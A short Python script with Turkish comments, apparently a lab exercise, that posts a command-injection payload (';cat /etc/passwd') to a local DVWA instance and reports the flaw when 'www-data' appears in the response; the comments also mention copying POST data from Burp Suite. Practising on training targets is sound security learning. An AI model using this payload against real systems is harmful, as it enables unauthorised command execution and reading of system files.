import requests
header={"Cookie":""}
url="http://127.0.0.1/dvwa/vulnerablities/exec/"
#post metodu kullanıldığı zaman burbsuitedeki en alt satırdaki data kısmını
#al yani mesela wordpress için bu giriş yaparken
#log=test&pwd=1234&aio_special_field=&g-recaptcha-response=03AGdBq27rq
# kısmı gibi

data={"ip":"127.0.0.1;cat /etc/passwd","submit":"submit"}
sonuc=requests.post(url=url,data=data,headers=header)
if "www-data" in str(sonuc.content):
    print("Command İnjections Vardır")
